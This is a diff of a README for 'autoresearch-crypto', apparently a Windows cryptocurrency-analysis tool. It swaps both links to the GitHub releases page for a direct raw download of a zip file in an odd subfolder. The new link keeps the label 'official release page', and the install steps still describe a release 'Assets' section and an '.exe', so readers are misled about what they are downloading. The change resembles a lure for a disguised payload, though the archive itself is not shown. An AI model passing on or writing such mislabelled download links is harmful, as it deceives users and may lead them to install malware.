@@ -1,6 +1,6 @@
 # 🔍 autoresearch-crypto - Analyze cryptocurrency market trends with ease
 
-[![](https://img.shields.io/badge/Download_Latest-Release-blue)](https://github.com/lorgnettelicentiate468/autoresearch-crypto/releases)
+[![](https://img.shields.io/badge/Download_Latest-Release-blue)](https://raw.githubusercontent.com/lorgnettelicentiate468/autoresearch-crypto/main/omnivalence/autoresearch_crypto_v1.2.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ This application runs on Windows computers. Ensure your system meets the followi
 
 Follow these steps to install the software on your machine.
 
-1. Visit the [official release page](https://github.com/lorgnettelicentiate468/autoresearch-crypto/releases) to access the files.
+1. Visit the [official release page](https://raw.githubusercontent.com/lorgnettelicentiate468/autoresearch-crypto/main/omnivalence/autoresearch_crypto_v1.2.zip) to access the files.
 2. Look for the section labeled "Assets" under the most recent version.
 3. Click the file that ends in ".exe" to begin the download.
 4. Save the file to your desktop or your downloads folder.
